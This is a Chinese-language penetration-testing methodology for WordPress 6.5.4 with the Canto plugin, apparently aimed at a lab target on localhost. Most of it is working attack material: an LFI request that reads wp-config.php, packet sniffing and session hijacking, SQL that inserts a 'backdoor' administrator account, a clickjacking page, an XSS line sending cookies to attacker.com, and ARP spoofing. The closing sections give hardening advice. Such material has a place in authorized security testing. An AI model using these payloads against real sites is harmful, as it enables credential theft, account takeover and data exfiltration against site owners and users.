# WordPress 安全配置错误攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

WordPress 6.5.4 应用存在多个严重的安全配置错误，包括：
- **HTTP-only 部署**：无 TLS/SSL 加密，凭证明文传输
- **明文密钥存储**：数据库凭证、OAuth token 明文存储
- **缺少安全响应头**：无 CSP、X-Frame-Options、HSTS 等防护
- **调试模式开启**：可能暴露敏感信息
- **目录列表启用**：泄露文件结构

### 1.2 受影响组件

| 配置项 | 位置 | 风险 | 影响 |
|-------|------|------|------|
| HTTP-only | Apache 配置 | 凭证拦截 | 会话劫持 |
| 明文数据库凭证 | wp-config.php | 信息泄露 | 数据库完全访问 |
| 明文 OAuth Token | wp_options 表 | 信息泄露 | Canto API 访问 |
| 缺少安全头 | Apache/PHP 配置 | 多种攻击 | XSS、点击劫持等 |
| 无 SameSite Cookie | WordPress 核心 | CSRF | 未授权操作 |

---

## 2. 攻击场景

### 2.1 HTTP-only 部署攻击

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **凭证拦截** | 登录请求明文传输 | 网络嗅探获取用户名密码 |
| **会话劫持** | Cookie 明文传输 | 网络嗅探获取会话 Cookie |
| **中间人攻击** | 无 TLS 加密 | 篡改请求/响应内容 |
| **OAuth Token 拦截** | OAuth 回调明文 | 获取第三方 API 访问权 |

### 2.2 明文密钥存储利用

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **数据库凭证泄露** | 读取 wp-config.php | 获取数据库完全访问权 |
| **OAuth Token 泄露** | 查询 wp_options 表 | 获取 Canto API 访问权 |
| **盐值和密钥泄露** | 读取 wp-config.php | 破解会话 Cookie |
| **SMTP 凭证泄露** | 查询 wp_options 表 | 劫持邮件发送 |

### 2.3 安全头缺失攻击

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **点击劫持** | 无 X-Frame-Options | 嵌入恶意 iframe |
| **MIME 嗅探** | 无 X-Content-Type-Options | 文件类型混淆攻击 |
| **XSS 攻击** | 无 CSP | 执行恶意脚本 |
| **协议降级** | 无 HSTS | 强制 HTTP 连接 |

---

## 3. 漏洞探测方法

### 3.1 HTTP-only 部署检测

#### 3.1.1 TLS/SSL 配置检查

```bash
#!/bin/bash
# HTTP-only 部署检测脚本

TARGET="http://localhost:35995"

# 检查 HTTP 响应
echo "=== HTTP Response Headers ==="
curl -I "$TARGET" | head -20

# 检查 HTTPS 重定向
echo -e "\n=== HTTPS Redirect Check ==="
curl -I "https://localhost:35995" 2>/dev/null || echo "HTTPS not configured"

# 检查 HSTS 头
echo -e "\n=== HSTS Header Check ==="
if curl -I "$TARGET" 2>/dev/null | grep -qi "Strict-Transport-Security"; then
    echo "HSTS: PRESENT"
else
    echo "HSTS: MISSING (VULNERABLE)"
fi

# 检查 Cookie Secure 标志
echo -e "\n=== Cookie Secure Flag Check ==="
curl -s -c - "$TARGET/wp-login.php" 2>/dev/null | grep -i "wordpress" | while read line; do
    if echo "$line" | grep -qi "secure"; then
        echo "Cookie Secure Flag: SET"
    else
        echo "Cookie Secure Flag: MISSING (VULNERABLE)"
    fi
done
```

#### 3.1.2 网络嗅探测试

```bash
# 在另一个终端启动 tcpdump
tcpdump -i any -s 0 -w capture.pcap 'port 35995'

# 在浏览器访问 WordPress 并登录
# 停止 tcpdump (Ctrl+C)

# 分析捕获的数据
strings capture.pcap | grep -E "(log=|pwd=|wordpress_logged_in)"
```

### 3.2 明文密钥存储检测

#### 3.2.1 wp-config.php 读取

```bash
# 通过 LFI 读取 wp-config.php
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php&subdomain=x&app_api=y&token=z"

# 响应包含：
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wp_user');
# define('DB_PASSWORD', 'ThisIsNotPartOfTheChallenge!');
# define('AUTH_KEY', '...');
# define('SECURE_AUTH_KEY', '...');
```

#### 3.2.2 数据库查询敏感信息

```bash
# 连接数据库查询敏感信息
mysql -u wp_user -p'ThisIsNotPartOfTheChallenge!' wordpress -e "
SELECT option_name, option_value 
FROM wp_options 
WHERE option_name IN (
    'fbc_app_token',
    'fbc_refresh_token',
    'fbc_flight_domain',
    'fbc_app_api',
    'mail_password',
    'smtp_password'
);
"
```

### 3.3 安全头缺失检测

```bash
#!/bin/bash
# 安全响应头检测脚本

TARGET="http://localhost:35995"
HEADERS=("Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Strict-Transport-Security" "Referrer-Policy")

echo "=== Security Headers Check ==="
for header in "${HEADERS[@]}"; do
    if curl -I "$TARGET" 2>/dev/null | grep -qi "$header"; then
        echo "$header: PRESENT"
    else
        echo "$header: MISSING (VULNERABLE)"
    fi
done
```

---

## 4. 漏洞利用方法

### 4.1 HTTP-only 部署攻击

#### 4.1.1 凭证拦截

```bash
# 攻击者在同一网络进行嗅探
tcpdump -i eth0 -A 'tcp port 35995 and host victim-ip' -w capture.pcap

# 受害者登录 WordPress
# 攻击者分析捕获的数据

# 提取凭证
strings capture.pcap | grep -E "log=.*&pwd="

# 示例输出：
# log=wordpress_admin&pwd=SuperSecretPassword123
```

#### 4.1.2 会话劫持

```bash
# 从捕获的数据中提取 Cookie
COOKIE=$(strings capture.pcap | grep "wordpress_logged_in" | head -1 | cut -d' ' -f2)

# 使用窃取的 Cookie 访问
curl -b "wordpress_logged_in_$COOKIE" "http://localhost:35995/wp-admin/"

# 成功访问管理员后台
```

### 4.2 明文密钥存储利用

#### 4.2.1 数据库完全访问

```bash
# 使用窃取的数据库凭证连接
mysql -h 127.0.0.1 -u wp_user -p'ThisIsNotPartOfTheChallenge!' wordpress

# 查询所有用户
SELECT ID, user_login, user_email, user_pass FROM wp_users;

# 查询所有会话 token
SELECT user_id, meta_value FROM wp_usermeta WHERE meta_key = 'session_tokens';

# 创建新的管理员账户
INSERT INTO wp_users (user_login, user_pass, user_email, user_status, display_name) 
VALUES ('backdoor', MD5('backdoor123'), 'attacker@evil.com', 0, 'Backdoor Admin');

INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
```

#### 4.2.2 OAuth Token 滥用

```bash
# 查询 OAuth token
mysql -u wp_user -p wordpress -e "
SELECT option_value FROM wp_options WHERE option_name = 'fbc_app_token';
"

# 使用窃取的 token 访问 Canto API
TOKEN=$(mysql -u wp_user -p wordpress -N -e "SELECT option_value FROM wp_options WHERE option_name = 'fbc_app_token';")

curl -H "Authorization: Bearer $TOKEN" \
    "https://oauth.canto.com/api/v1/search?keyword=secret"
```

### 4.3 安全头缺失攻击

#### 4.3.1 点击劫持攻击

```html
<!-- clickjacking.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Demo</title>
    <style>
        iframe {
            width: 100%;
            height: 600px;
            border: none;
            position: absolute;
            top: 100px;
            left: 100px;
            opacity: 0.1;
        }
        .overlay {
            position: absolute;
            top: 150px;
            left: 150px;
            width: 300px;
            height: 100px;
            background: red;
            color: white;
            text-align: center;
            line-height: 100px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Click here to win a prize!</h1>
    <div class="overlay">CLICK HERE</div>
    <iframe src="http://localhost:35995/wp-admin/post.php?post=1&action=delete"></iframe>
</body>
</html>
```

#### 4.3.2 CSP 绕过 XSS

```html
<!-- 无 CSP 时，以下 XSS 可执行 -->
<script>
    fetch('https://attacker.com/steal?cookie=' + btoa(document.cookie));
</script>

<!-- 如果有严格 CSP，这种攻击会被阻止 -->
<!-- Content-Security-Policy: default-src 'self' -->
```

### 4.4 目录列表攻击

```bash
# 检查目录列表是否启用
curl "http://localhost:35995/wp-content/uploads/"

# 如果返回文件列表，说明目录列表启用
# 可以浏览所有上传的文件

# 批量下载敏感文件
curl "http://localhost:35995/wp-content/uploads/" | grep -oP 'href="\K[^"]+\.(pdf|doc|xls)' | while read file; do
    curl -O "http://localhost:35995/wp-content/uploads/$file"
done
```

---

## 5. 绕过方法

### 5.1 绕过网络防护

#### 5.1.1 ARP 欺骗

```bash
# 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# 使用 arpspoof 进行 ARP 欺骗
arpspoof -i eth0 -t victim-ip gateway
arpspoof -i eth0 -t gateway victim-ip

# 现在可以拦截受害者的流量
```

### 5.2 绕过文件权限

#### 5.2.1 LFI 读取配置文件

```bash
# 即使 wp-config.php 权限为 644，通过 LFI 仍可读取
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php&subdomain=x&app_api=y&token=z"
```

### 5.3 绕过 Cookie HttpOnly

#### 5.3.1 网络层拦截

```bash
# HttpOnly 防止 JavaScript 访问 Cookie
# 但无法防止网络嗅探

# 使用 tcpdump 直接捕获 Cookie
tcpdump -i eth0 -A 'port 35995' | grep "Set-Cookie: wordpress"
```

---

## 6. 渗透测试决策流程

```
开始配置审计
    │
    ▼
识别配置问题
    │
    ├── HTTP/HTTPS 检查
    ├── 安全头检查
    ├── Cookie 标志检查
    └── 目录列表检查
    │
    ▼
测试网络层安全
    │
    ├── TLS/SSL 配置
    ├── 凭证传输加密
    └── 会话保护
    │
    ▼
测试数据存储安全
    │
    ├── 密钥存储方式
    ├── 凭证加密
    └── 敏感数据保护
    │
    ▼
测试响应头配置
    │
    ├── CSP 配置
    ├── X-Frame-Options
    ├── HSTS
    └── 其他安全头
    │
    ▼
深度利用
    │
    ├── 凭证拦截
    ├── 数据泄露
    ├── 点击劫持
    └── XSS 攻击
```

---

## 7. 常用 Payload 速查表

| 类别 | 目标/环境 | Payload 示例 | 说明 |
|-----|---------|------------|------|
| **凭证拦截** | HTTP-only | tcpdump 捕获 | 网络嗅探 |
| **会话劫持** | Cookie 嗅探 | `wordpress_logged_in_*=...` | 窃取会话 |
| **数据库访问** | wp-config.php | LFI 读取 | 获取数据库凭证 |
| **OAuth Token** | wp_options 表 | SQL 查询 | 获取 API token |
| **点击劫持** | 无 X-Frame-Options | iframe 嵌入 | 诱导点击 |
| **目录列表** | 启用的目录列表 | `curl /uploads/` | 浏览文件 |
| **安全头检测** | 响应头分析 | `curl -I` | 检查配置 |

---

## 8. WordPress 特定场景

### 8.1 结合 LFI 攻击

```
1. 通过 LFI 读取 wp-config.php
2. 获取数据库凭证和盐值
3. 连接数据库提取会话 token
4. 使用盐值破解 Cookie HMAC
5. 伪造管理员会话
```

### 8.2 结合 XSS 攻击

```
1. 无 CSP 允许 XSS 执行
2. XSS 窃取管理员 Cookie
3. 使用 Cookie 访问管理功能
4. 修改安全配置加剧漏洞
```

### 8.3 结合 SSRF 攻击

```
1. 通过 SSRF 访问云元数据
2. 获取 IAM 凭证
3. 访问云存储中的备份
4. 提取所有敏感配置
```

---

## 9. 防御建议

### 9.1 配置层修复

```apache
# Apache 配置 - 强制 HTTPS
<VirtualHost *:80>
    ServerName example.com
    Redirect permanent / https://example.com/
</VirtualHost>

<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
    
    # 安全响应头
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Content-Security-Policy "default-src 'self'"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
</VirtualHost>

# 禁用目录列表
<Directory /var/www/html>
    Options -Indexes
</Directory>
```

### 9.2 WordPress 配置

```php
// wp-config.php 增强配置
// 强制 HTTPS
define('FORCE_SSL_ADMIN', true);
define('FORCE_SSL_LOGIN', true);

// 安全密钥（使用官方生成器）
// https://api.wordpress.org/secret-key/1.1/salt/

// 禁用文件编辑
define('DISALLOW_FILE_EDIT', true);

// 限制登录尝试次数
define('LIMIT_LOGIN_ATTEMPTS', 5);
```

### 9.3 数据库加密

```sql
-- 不要明文存储敏感信息
-- 使用 MySQL 加密函数

-- 加密存储
UPDATE wp_options 
SET option_value = AES_ENCRYPT(option_value, 'encryption_key') 
WHERE option_name IN ('fbc_app_token', 'mail_password');

-- 解密读取
SELECT AES_DECRYPT(option_value, 'encryption_key') 
FROM wp_options 
WHERE option_name = 'fbc_app_token';
```

---

**文档版本：** 1.0  
**最后更新：** 2025-10-29  
**适用目标：** WordPress 6.5.4 + Canto DAM 插件 v3.0.4  
**关联漏洞：** SM-VULN-01 至 SM-VULN-XX
